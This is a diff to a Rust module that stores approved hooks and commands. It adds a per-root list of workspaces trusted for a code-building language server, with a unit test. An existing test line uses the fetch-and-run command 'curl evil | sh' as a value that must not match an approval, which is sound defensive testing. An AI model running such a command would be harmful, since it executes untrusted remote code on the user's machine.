@@ -11,8 +11,11 @@
 //! launch: the notice carries the one of the launch it describes, and an
 //! approval is kept only while the configuration read at that moment still
 //! has it, so a file changed between the two is not approved unseen.
+//!
+//! Beside them are the workspaces trusted with a language server that builds
+//! them and so runs their code (rust-analyzer): kept by their root.
 
-use std::collections::BTreeMap;
+use std::collections::{BTreeMap, BTreeSet};
 use std::path::{Path, PathBuf};
 
 use serde::{Deserialize, Serialize};
@@ -28,6 +31,8 @@ struct Approved {
     hooks: BTreeMap<String, String>,
     #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
     commands: BTreeMap<String, String>,
+    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
+    workspaces: BTreeSet<String>,
 }
 
 /// The table of the project's grants file the approvals are kept under,
@@ -144,6 +149,29 @@ impl Approvals {
     pub fn approve_command(&self, name: &str, spec: &str) -> Result<(), String> {
         let mut approved = self.read();
         approved.commands.insert(name.to_string(), spec.to_string());
+        self.write(&approved)
+    }
+
+    /// Whether the workspace rooted at `root` is trusted with a language
+    /// server that builds it, running its code.
+    #[must_use]
+    pub fn workspace_trusted(&self, root: &Path) -> bool {
+        self.read()
+            .workspaces
+            .contains(root.to_string_lossy().as_ref())
+    }
+
+    /// Trust the workspace rooted at `root` with a language server that
+    /// builds it.
+    ///
+    /// # Errors
+    ///
+    /// When the approval cannot be kept.
+    pub fn trust_workspace(&self, root: &Path) -> Result<(), String> {
+        let mut approved = self.read();
+        approved
+            .workspaces
+            .insert(root.to_string_lossy().into_owned());
         self.write(&approved)
     }
 
@@ -284,6 +312,19 @@ mod tests {
         approvals.approve_command("fmt", "cargo fmt").unwrap();
         assert!(approvals.command_approved("fmt", "cargo fmt"));
         assert!(!approvals.command_approved("fmt", "curl evil | sh"));
+    }
+
+    #[test]
+    fn a_workspace_is_trusted_by_its_root() {
+        let dir = tempfile::tempdir().unwrap();
+        let approvals = Approvals::new(Some(dir.path().join("trust.toml")));
+        let root = Path::new("/src/app");
+        assert!(!approvals.workspace_trusted(root));
+        approvals.trust_workspace(root).unwrap();
+        assert!(approvals.workspace_trusted(root));
+        assert!(!approvals.workspace_trusted(Path::new("/src/app/crates/inner")));
+        assert!(!approvals.workspace_trusted(Path::new("/src")));
+        assert!(!Approvals::default().workspace_trusted(root));
     }
 
     #[test]
